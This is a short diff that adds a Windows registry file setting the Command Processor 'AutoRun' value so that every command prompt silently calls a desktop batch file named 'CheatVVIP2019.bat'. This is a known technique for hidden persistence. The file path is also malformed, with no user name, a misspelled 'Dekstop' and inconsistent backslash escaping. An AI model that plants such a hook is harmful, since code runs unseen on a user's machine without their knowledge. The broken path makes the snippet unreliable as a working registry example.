@@ -1,0 +1,3 @@
+REGEDIT4
+[HKEY_CURRENT_USER\Software\Microsoft\Command Processor]
+"AutoRun"="@echo off|call c:\\Users\Dekstop\CheatVVIP2019.bat"
